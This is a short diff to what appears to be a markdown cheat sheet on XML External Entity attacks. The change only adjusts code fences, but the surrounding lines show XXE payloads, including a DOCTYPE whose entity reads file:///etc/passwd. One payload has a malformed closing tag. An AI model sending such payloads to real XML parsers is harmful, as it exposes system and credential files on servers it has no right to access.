@@ -8,9 +8,10 @@
 ]>
 ...
 <sometag>&exploit;</sometag>
+```
 
 - Path traversal and fetching files
-
+```
 <!DOCTYPE foo [<!ENTITY exploit SYSTEM "file:///etc/passwd">]>
 ...
 <sometag>&exploit<sometag>
